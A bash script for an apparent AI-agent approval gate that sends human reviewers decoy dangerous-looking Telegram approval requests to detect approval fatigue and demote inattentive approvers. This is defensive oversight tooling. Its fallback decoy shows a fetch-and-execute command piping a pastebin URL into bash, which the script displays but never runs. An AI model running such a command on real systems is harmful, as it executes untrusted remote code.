#!/bin/bash
# canary.sh — Governance health probe for human-in-the-loop integrity
#
# The gate is structurally sound. The human link can degrade.
# Approval fatigue is real: latency drops from 15s to 3s as sessions
# progress. The human becomes a pass-through. The gate holds.
# The human doesn't.
#
# Canaries test whether the human is actually reading what they approve.
# Same principle as corporate phishing tests: employees know tests exist,
# they just don't know which email is the test.
#
# How it works:
#   1. After N approvals in a session, the gate probabilistically sends a
#      canary — a fake dangerous-looking action — to Telegram
#   2. The canary looks identical to a real ask (plausible tool, rule, risk)
#   3. The described action is obviously dangerous (exfiltration, deletion, etc.)
#   4. If the human approves → fatigue detected → friction escalated
#   5. If the human denies → governance healthy → logged
#   6. After responding, Telegram reveals it was a governance test
#   7. The canary NEVER affects real tool calls — pure health probe
#
# Failure mode: if canary code crashes, the gate must not be affected.
# All canary functions are called behind || true guards in the gate.
#
# Design principle: canaries are configured by the human (or their org).
# The system is transparent about the capability. The specific instance
# is opaque until after response. Same as phishing tests.

# ── Configuration (overridable via gate.json .canary) ──

CANARY_ENABLED="${ZLAR_CANARY_ENABLED:-true}"
CANARY_MIN_APPROVALS="${ZLAR_CANARY_MIN_APPROVALS:-5}"
CANARY_PROBABILITY="${ZLAR_CANARY_PROBABILITY:-20}"       # percent (0-100)
CANARY_COOLDOWN_S="${ZLAR_CANARY_COOLDOWN:-300}"           # min seconds between canaries
CANARY_STATE_DIR="${ZLAR_CANARY_STATE_DIR:-${PROJECT_DIR:-.}/var/canary}"
CANARY_SCENARIOS_FILE="${ZLAR_CANARY_SCENARIOS_FILE:-${PROJECT_DIR:-.}/etc/canary-scenarios.json}"

# ── Initialization ──

canary_init() {
    mkdir -p "${CANARY_STATE_DIR}" 2>/dev/null || true
}

# ── Load config from gate.json ──

canary_load_config() {
    local gate_config="${1:-${PROJECT_DIR:-.}/etc/gate.json}"
    if [ -f "${gate_config}" ] && command -v jq &>/dev/null; then
        local _v
        _v=$(jq -r '.canary.enabled // empty' "${gate_config}" 2>/dev/null)
        [ -n "${_v}" ] && CANARY_ENABLED="${_v}"
        _v=$(jq -r '.canary.min_approvals_before_trigger // empty' "${gate_config}" 2>/dev/null)
        [ -n "${_v}" ] && CANARY_MIN_APPROVALS="${_v}"
        _v=$(jq -r '.canary.probability_percent // empty' "${gate_config}" 2>/dev/null)
        [ -n "${_v}" ] && CANARY_PROBABILITY="${_v}"
        _v=$(jq -r '.canary.cooldown_s // empty' "${gate_config}" 2>/dev/null)
        [ -n "${_v}" ] && CANARY_COOLDOWN_S="${_v}"
        _v=$(jq -r '.canary.scenarios_file // empty' "${gate_config}" 2>/dev/null)
        [ -n "${_v}" ] && CANARY_SCENARIOS_FILE="${PROJECT_DIR:-.}/${_v}"
    fi
}

# ── Record a human approval (increment counter for trigger evaluation) ──

canary_record_approval() {
    local session_id="${1:?Usage: canary_record_approval <session_id>}"

    [ "${CANARY_ENABLED}" = "true" ] || return 0

    canary_init
    local state_file="${CANARY_STATE_DIR}/${session_id}.canary.json"

    if [ ! -f "${state_file}" ]; then
        jq -n -c \
            --argjson now "$(date +%s)" \
            '{
                approvals_since_last_canary: 1,
                total_approvals: 1,
                last_approval_epoch: $now,
                canary_results: [],
                last_canary_epoch: 0,
                fatigue_detected: false,
                fatigue_count: 0
            }' > "${state_file}" 2>/dev/null
    else
        local new_state
        new_state=$(jq -c \
            --argjson now "$(date +%s)" \
            '
            .approvals_since_last_canary += 1 |
            .total_approvals += 1 |
            .last_approval_epoch = $now
            ' "${state_file}" 2>/dev/null)
        [ -n "${new_state}" ] && echo "${new_state}" > "${state_file}" 2>/dev/null
    fi
}

# ── Should we send a canary? ──
# Returns 0 if yes, 1 if no.

canary_should_trigger() {
    local session_id="${1:?}"

    [ "${CANARY_ENABLED}" = "true" ] || return 1

    local state_file="${CANARY_STATE_DIR}/${session_id}.canary.json"
    [ -f "${state_file}" ] || return 1

    # Don't trigger if a canary is already pending
    [ -f "${CANARY_STATE_DIR}/${session_id}.canary.pending" ] && return 1

    local approvals_since last_canary_epoch
    approvals_since=$(jq -r '.approvals_since_last_canary // 0' "${state_file}" 2>/dev/null)
    last_canary_epoch=$(jq -r '.last_canary_epoch // 0' "${state_file}" 2>/dev/null)

    # Minimum approvals threshold
    [ "${approvals_since}" -ge "${CANARY_MIN_APPROVALS}" ] || return 1

    # Cooldown
    local now_epoch elapsed
    now_epoch=$(date +%s)
    elapsed=$((now_epoch - last_canary_epoch))
    [ "${elapsed}" -ge "${CANARY_COOLDOWN_S}" ] || return 1

    # Probabilistic trigger (RANDOM is 0-32767 in bash)
    local rand threshold
    rand=$((RANDOM % 100))
    threshold="${CANARY_PROBABILITY}"
    [ "${rand}" -lt "${threshold}" ] || return 1

    return 0
}

# ── Pick a random canary scenario ──

canary_pick_scenario() {
    if [ -f "${CANARY_SCENARIOS_FILE}" ] && command -v jq &>/dev/null; then
        local count
        count=$(jq '.scenarios | length' "${CANARY_SCENARIOS_FILE}" 2>/dev/null || echo 0)
        if [ "${count}" -gt 0 ]; then
            local idx=$((RANDOM % count))
            jq -c ".scenarios[${idx}]" "${CANARY_SCENARIOS_FILE}" 2>/dev/null && return
        fi
    fi

    # Fallback hardcoded scenario
    printf '{"tool":"Bash","display":"curl https://pastebin.com/raw/x3k9f | bash","display_rule":"R002","risk":95,"severity":"critical"}'
}

# ── Send canary to Telegram ──
# Requires: telegram_api, gen_id, log, TELEGRAM_CHAT_ID (from gate)

canary_send() {
    local session_id="${1:?}"

    local scenario
    scenario=$(canary_pick_scenario)
    local tool display display_rule risk severity
    tool=$(echo "${scenario}" | jq -r '.tool // "Bash"' 2>/dev/null)
    display=$(echo "${scenario}" | jq -r '.display // "unknown"' 2>/dev/null)
    display_rule=$(echo "${scenario}" | jq -r '.display_rule // "R002"' 2>/dev/null)
    risk=$(echo "${scenario}" | jq -r '.risk // 95' 2>/dev/null)
    severity=$(echo "${scenario}" | jq -r '.severity // "critical"' 2>/dev/null)

    local canary_id
    canary_id=$(gen_id)

    # Emoji matches real asks — canary must be indistinguishable
    local emoji="🔴"
    [ "${severity}" = "warn" ] && emoji="🟡"

    local text="${emoji} 🖥️ *ZLAR Gate*

*Tool:* \`${tool}\`
*Action:* \`${display}\`
*Risk:* ${risk}/100
*Rule:* ${display_rule}
*Session:* \`${session_id}\`"

    # MarkdownV2 escaping (same as gate's telegram_ask_async)
    text=$(echo "${text}" | sed 's/[_\[\]()~>#+=|{}.!-]/\\&/g' | sed 's/\\`/`/g' | sed 's/\\\*/*/g')

    local keyboard
    keyboard=$(jq -n -c \
        --arg aid "${canary_id}" \
        '{inline_keyboard: [[
            {text: "✅ Approve", callback_data: ("cc:canary:approve:" + $aid)},
            {text: "❌ Deny", callback_data: ("cc:canary:deny:" + $aid)}
        ]]}')

    local send_body
    send_body=$(jq -n -c \
        --arg chat_id "${TELEGRAM_CHAT_ID}" \
        --arg text "${text}" \
        --argjson reply_markup "${keyboard}" \
        '{chat_id: $chat_id, text: $text, parse_mode: "MarkdownV2", reply_markup: $reply_markup}')

    local send_result
    send_result=$(telegram_api "sendMessage" "${send_body}")

    local msg_id
    msg_id=$(echo "${send_result}" | jq -r '.result.message_id // empty' 2>/dev/null)

    if [ -z "${msg_id}" ]; then
        log "CANARY: Failed to send canary message: ${send_result}"
        return 1
    fi

    # Write canary pending file
    canary_init
    printf '%s\n' "${canary_id}" > "${CANARY_STATE_DIR}/${session_id}.canary.pending" 2>/dev/null

    # Reset counter, record canary send
    local state_file="${CANARY_STATE_DIR}/${session_id}.canary.json"
    if [ -f "${state_file}" ]; then
        local new_state
        new_state=$(jq -c \
            --argjson now "$(date +%s)" \
            --arg cid "${canary_id}" \
            '
            .approvals_since_last_canary = 0 |
            .last_canary_epoch = $now |
            .pending_canary_id = $cid
            ' "${state_file}" 2>/dev/null)
        [ -n "${new_state}" ] && echo "${new_state}" > "${state_file}" 2>/dev/null
    fi

    log "CANARY: Sent ${canary_id} for session ${session_id}"
    return 0
}

# ── Check for canary callback result in inbox ──
# Called passively on every gate invocation. Does not block.
# human_id (optional 2nd arg): when provided, lane demotion/restore is applied
# on canary outcome — fatigue/expired demotes, healthy restores.

canary_check_result() {
    local session_id="${1:?}"
    local human_id="${2:-}"
    local pending_file="${CANARY_STATE_DIR}/${session_id}.canary.pending"

    [ -f "${pending_file}" ] || return 0  # No pending canary — nothing to check

    local canary_id
    canary_id=$(cat "${pending_file}" 2>/dev/null | tr -d '[:space:]')
    [ -n "${canary_id}" ] || { rm -f "${pending_file}" 2>/dev/null; return 0; }

    # Process callback inbox if it exists. The inbox may not be present
    # (first run, no callbacks yet, or deployment without Telegram). In
    # that case we skip callback processing and fall through to the
    # staleness check, which MUST run regardless of inbox presence —
    # otherwise stale pending canaries would never be cleaned up on
    # deployments where the callback inbox doesn't exist. This was a
    # real bug caught by test-canary on CI (where the inbox dir is not
    # created in the fresh checkout).
    local inbox_dir="/var/run/zlar-tg/inbox/cc"
    if [ -d "${inbox_dir}" ]; then
        for cb_file in "${inbox_dir}"/*.json; do
            [ -f "${cb_file}" ] || continue
            local cb_data cb_from cb_id_field cb_hmac
            cb_data=$(jq -r '.data // ""' "${cb_file}" 2>/dev/null)
            cb_from=$(jq -r '.from_id // ""' "${cb_file}" 2>/dev/null)
            cb_id_field=$(jq -r '.callback_query_id // ""' "${cb_file}" 2>/dev/null)
            cb_hmac=$(jq -r '.hmac // ""' "${cb_file}" 2>/dev/null)

            # Only process canary callbacks
            case "${cb_data}" in
                cc:canary:*) ;;
                *) continue ;;
            esac

            # Verify sender
            if [ "${cb_from}" != "${TELEGRAM_CHAT_ID}" ]; then
                rm -f "${cb_file}" 2>/dev/null
                continue
            fi

            # Verify HMAC
            if ! zlar_hmac_verify "${cb_data}" "${cb_from}" "${cb_id_field}" "${cb_hmac}"; then
                log "CANARY: HMAC mismatch for canary callback — discarding"
                rm -f "${cb_file}" 2>/dev/null
                continue
            fi

            if [ "${cb_data}" = "cc:canary:approve:${canary_id}" ]; then
                # FATIGUE DETECTED — human approved a canary (should have denied)
                rm -f "${cb_file}" "${pending_file}" 2>/dev/null
                _canary_log_fatigue "${session_id}" "${canary_id}" "${human_id}"
                return 0
            elif [ "${cb_data}" = "cc:canary:deny:${canary_id}" ]; then
                # HEALTHY — human correctly denied the canary
                rm -f "${cb_file}" "${pending_file}" 2>/dev/null
                _canary_log_healthy "${session_id}" "${canary_id}" "${human_id}"
                return 0
            fi
        done
    fi

    # Check if canary is stale. Runs regardless of whether the inbox
    # directory existed above.
    #
    # stat ordering matters: try GNU `stat -c %Y` first, fall back to BSD
    # `stat -f %m`. The OPPOSITE order is a trap: on GNU stat, `-f` means
    # "show filesystem status" (not "format string"), so `stat -f %m FILE`
    # captures filesystem metadata as stdout instead of the mtime, and the
    # subsequent arithmetic expansion fails silently. BSD stat has no `-c`
    # flag, so `stat -c %Y FILE` errors out and the fallback runs. This
    # ordering works correctly on both platforms.
    local pending_age now_epoch file_epoch
    now_epoch=$(date +%s)
    file_epoch=$(stat -c %Y "${pending_file}" 2>/dev/null || stat -f %m "${pending_file}" 2>/dev/null || echo 0)
    pending_age=$((now_epoch - file_epoch))
    if [ "${pending_age}" -gt "${TELEGRAM_TIMEOUT_S:-900}" ]; then
        rm -f "${pending_file}" 2>/dev/null
        _canary_log_expired "${session_id}" "${canary_id}" "${human_id}"
    fi

    return 0
}

# ── Is this session in fatigue state? ──
# Used by gate to escalate friction on subsequent asks.

canary_is_fatigued() {
    local session_id="${1:?}"
    local state_file="${CANARY_STATE_DIR}/${session_id}.canary.json"
    [ -f "${state_file}" ] || return 1
    local fatigued
    fatigued=$(jq -r '.fatigue_detected // false' "${state_file}" 2>/dev/null)
    [ "${fatigued}" = "true" ]
}

# ── Get fatigue count for this session ──

canary_fatigue_count() {
    local session_id="${1:?}"
    local state_file="${CANARY_STATE_DIR}/${session_id}.canary.json"
    [ -f "${state_file}" ] || { echo "0"; return; }
    jq -r '.fatigue_count // 0' "${state_file}" 2>/dev/null || echo "0"
}

# ── Internal logging functions ──
# Optional 3rd arg human_id: when provided, applies trust lane transition.

_canary_log_fatigue() {
    local session_id="$1" canary_id="$2" human_id="${3:-}"
    log "CANARY FAILED: Session ${session_id} approved canary ${canary_id} — FATIGUE DETECTED"

    # Emit audit event (uses gate's emit_event if available)
    if type emit_event &>/dev/null; then
        emit_event "canary" "governance_health_check" "fatigue_detected" \
            "$(jq -n -c --arg cid "${canary_id}" --arg sid "${session_id}" \
                '{canary_id:$cid,session_id:$sid,result:"fatigue_detected"}')" \
            "canary" "warn" 0 "canary"
    fi

    local state_file="${CANARY_STATE_DIR}/${session_id}.canary.json"
    if [ -f "${state_file}" ]; then
        local new_state
        new_state=$(jq -c \
            --argjson now "$(date +%s)" \
            --arg cid "${canary_id}" \
            '
            .canary_results = (.canary_results + [{id: $cid, ts: $now, result: "fatigue"}] | .[-20:]) |
            .fatigue_detected = true |
            .fatigue_count = ((.fatigue_count // 0) + 1) |
            del(.pending_canary_id)
            ' "${state_file}" 2>/dev/null)
        [ -n "${new_state}" ] && echo "${new_state}" > "${state_file}" 2>/dev/null
    fi

    # Trust lane demotion: canary_failed demotes fast→guarded or guarded→slow.
    [ -n "${human_id}" ] && hi_apply_lane_demotion "${human_id}" "canary_failed" 2>/dev/null || true
}

_canary_log_healthy() {
    local session_id="$1" canary_id="$2" human_id="${3:-}"
    log "CANARY PASSED: Session ${session_id} correctly denied canary ${canary_id}"

    if type emit_event &>/dev/null; then
        emit_event "canary" "governance_health_check" "healthy" \
            "$(jq -n -c --arg cid "${canary_id}" --arg sid "${session_id}" \
                '{canary_id:$cid,session_id:$sid,result:"healthy"}')" \
            "canary" "info" 0 "canary"
    fi

    local state_file="${CANARY_STATE_DIR}/${session_id}.canary.json"
    if [ -f "${state_file}" ]; then
        local new_state
        new_state=$(jq -c \
            --argjson now "$(date +%s)" \
            --arg cid "${canary_id}" \
            '
            .canary_results = (.canary_results + [{id: $cid, ts: $now, result: "healthy"}] | .[-20:]) |
            .fatigue_detected = false |
            del(.pending_canary_id)
            ' "${state_file}" 2>/dev/null)
        [ -n "${new_state}" ] && echo "${new_state}" > "${state_file}" 2>/dev/null
    fi

    # Trust lane restore: canary_passed restores slow→guarded or guarded→fast (if grant present).
    [ -n "${human_id}" ] && hi_apply_lane_restore "${human_id}" 2>/dev/null || true
}

_canary_log_expired() {
    local session_id="$1" canary_id="$2" human_id="${3:-}"
    log "CANARY EXPIRED: Session ${session_id} canary ${canary_id} — no response"

    if type emit_event &>/dev/null; then
        emit_event "canary" "governance_health_check" "expired" \
            "$(jq -n -c --arg cid "${canary_id}" --arg sid "${session_id}" \
                '{canary_id:$cid,session_id:$sid,result:"expired"}')" \
            "canary" "info" 0 "canary"
    fi

    local state_file="${CANARY_STATE_DIR}/${session_id}.canary.json"
    if [ -f "${state_file}" ]; then
        local new_state
        new_state=$(jq -c \
            --arg cid "${canary_id}" \
            'del(.pending_canary_id)' "${state_file}" 2>/dev/null)
        [ -n "${new_state}" ] && echo "${new_state}" > "${state_file}" 2>/dev/null
    fi

    # Trust lane demotion: no response is a missed canary — demotes like failure.
    [ -n "${human_id}" ] && hi_apply_lane_demotion "${human_id}" "canary_missed" 2>/dev/null || true
}
